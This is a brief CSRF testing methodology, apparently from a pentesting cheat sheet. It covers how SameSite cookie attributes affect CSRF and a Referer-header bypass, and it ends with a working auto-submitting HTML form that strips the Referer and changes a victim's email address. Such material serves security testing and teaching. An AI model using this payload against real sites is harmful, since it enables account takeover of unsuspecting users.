## CSRF Methodology
<br/>

**Step 1**<br/>
The first thing to check in a CSRF attack is the security headers on the session cookie.
#### `SameSite=Strict` - CSRF Not Possible

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=strict;
```

#### `SameSite=LAX` - CSRF Only Possible on GET Request

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=lax;
```

#### `SameSite=NONE` - CSRF Possible

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=none;
```

**Step 2**<br/>
Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. The following are possible bypasses for the Referer header based CSRF protection.

1) *Referer Header Omitted*<br/>
Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted. We can strip the referer using the following META tag.

```html
<meta name="referrer" content="never">
```

*PoC*
```html
<html>
    <body>
        <meta name="referrer" content="never">
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
